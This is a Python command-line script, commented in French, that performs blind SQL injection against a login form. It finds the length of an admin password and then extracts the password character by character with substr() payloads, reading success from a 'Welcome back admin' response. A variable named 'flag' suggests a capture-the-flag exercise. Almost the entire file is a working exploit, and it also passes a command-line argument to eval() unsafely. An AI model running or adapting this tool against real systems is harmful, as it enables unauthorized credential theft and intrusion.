#!/bin/env python3

import requests
import string
import time
import argparse


start = time.time()

def get_password_length(session, username, url):
    """Function: Determine the length of the password."""
    for length in range(1, 21):  # Limite à 20 caractères, ajuste si nécessaire
        sql_payload = f"admin' and length((select password from users where username='{username}'))={length}--"
        #print(f"Payload SQL pour la longueur: {sql_payload}")
        
        data = {
            "username": sql_payload,
            "password": "test"
        }
        
        response = session.post(url, data=data)
        
        # Affiche le code de statut HTTP
        #print(f"Status Code: {response.status_code}")
        
        # Vérifie la réponse pour déterminer si la longueur est correcte
        if 'Welcome back admin' in response.text:
            print(f"Longueur du mot de passe trouvée: {length} caractères")
            return length
    
    print("Longueur du mot de passe non trouvée.")
    return None

def injectsql(url, login_data):
    """Function: Perform SQL injection via login to extract the password"""
    session = requests.Session()

    username = 'admin'
    flag = ''
    
    # Déterminer la longueur du mot de passe
    password_length = get_password_length(session, username, url)
    
    if not password_length:
        return  # Si la longueur n'est pas trouvée, arrête l'exécution

    characters = string.ascii_letters + string.digits + string.punctuation  # Tous les caractères possibles
   
    # Boucle pour retrouver le mot de passe 
    for i in range(1, password_length + 1):
        for c in characters:
            sql_payload = f"admin' and substr((select password from users where username='{username}'), {i}, 1)='{c}'--"
            #print(f"Payload SQL: {sql_payload}")
            
            data = {
                "username": sql_payload,
                "password": "anything"
            }
            
            # Envoi de la requête POST
            response = session.post(url, data=data)
            
            # Afficher le code de statut HTTP
            #print(f"Status Code: {response.status_code}")
            
            # Afficher le contenu de la réponse pour vérifier ce que le serveur renvoie
            #print(f"Response Text:\n{response.text[:500]}")  # Limite l'affichage aux 500 premiers caractères
            
            # Condition pour détecter une réponse correcte
            if 'Welcome back admin' in response.text:
                flag += c
                print(f"Caractère trouvé {i}: {c}")
                break
    
    print(f"Password : {flag}")
    end = time.time()
    rt = end - start
    print('Temps total de réponse: ', rt)

#injectsql()

if __name__=="__main__":

   print("""

                                                                                                                                                          
                                                                                                                                                        dddddddd
           SSSSSSSSSSSSSSS      QQQQQQQQQ     LLLLLLLLLLL                              BBBBBBBBBBBBBBBBB   lllllll   iiii                               d::::::d
         SS:::::::::::::::S   QQ:::::::::QQ   L:::::::::L                              B::::::::::::::::B  l:::::l  i::::i                              d::::::d
        S:::::SSSSSS::::::S QQ:::::::::::::QQ L:::::::::L                              B::::::BBBBBB:::::B l:::::l   iiii                               d::::::d
        S:::::S     SSSSSSSQ:::::::QQQ:::::::QLL:::::::LL                              BB:::::B     B:::::Bl:::::l                                      d:::::d 
        S:::::S            Q::::::O   Q::::::Q  L:::::L                                  B::::B     B:::::B l::::l iiiiiiinnnn  nnnnnnnn        ddddddddd:::::d 
        S:::::S            Q:::::O     Q:::::Q  L:::::L                                  B::::B     B:::::B l::::l i:::::in:::nn::::::::nn    dd::::::::::::::d 
         S::::SSSS         Q:::::O     Q:::::Q  L:::::L                                  B::::BBBBBB:::::B  l::::l  i::::in::::::::::::::nn  d::::::::::::::::d 
          SS::::::SSSSS    Q:::::O     Q:::::Q  L:::::L                ---------------   B:::::::::::::BB   l::::l  i::::inn:::::::::::::::nd:::::::ddddd:::::d 
            SSS::::::::SS  Q:::::O     Q:::::Q  L:::::L                -:::::::::::::-   B::::BBBBBB:::::B  l::::l  i::::i  n:::::nnnn:::::nd::::::d    d:::::d 
               SSSSSS::::S Q:::::O     Q:::::Q  L:::::L                ---------------   B::::B     B:::::B l::::l  i::::i  n::::n    n::::nd:::::d     d:::::d 
                    S:::::SQ:::::O  571LL::::Q  L:::::L                                  B::::B     B:::::B l::::l  i::::i  n::::n    n::::nd:::::d     d:::::d 
                    S:::::SQ::::::O Q::::::::Q  L:::::L         LLLLLL                   B::::B     B:::::B l::::l  i::::i  n::::n    n::::nd:::::d     d:::::d 
        SSSSSSS     S:::::SQ:::::::QQ::::::::QLL:::::::LLLLLLLLL:::::L                 BB:::::BBBBBB::::::Bl::::::li::::::i n::::n    n::::nd::::::ddddd::::::dd
        S::::::SSSSSS:::::S QQ::::::::::::::Q L::::::::::::::::::::::L                 B:::::::::::::::::B l::::::li::::::i n::::n    n::::n d:::::::::::::::::d
        S:::::::::::::::SS    QQ:::::::::::Q  L::::::::::::::::::::::L                 B::::::::::::::::B  l::::::li::::::i n::::n    n::::n  d:::::::::ddd::::d
         SSSSSSSSSSSSSSS        QQQQQQQQ::::QQLLLLLLLLLLLLLLLLLLLLLLLL                 BBBBBBBBBBBBBBBBB   lllllllliiiiiiii nnnnnn    nnnnnn   ddddddddd   ddddd
                                        Q:::::Q                                                                                                                 
                                         QQQQQQ                                                                                                                 

    
    """)
    
   parser = argparse.ArgumentParser(description='SQL Injection Blind')
   parser.add_argument('-u', '--url', required=True, help='URL cible')
   parser.add_argument('-d', '--data', required=True, help='Donnée de connexion au format JSON')

   args = parser.parse_args()

   #Extraire les données de login du paramétre
   login_data = eval(args.data) 

   #Appeler la fonction avec les paramétres 
   injectsql(args.url, login_data)


   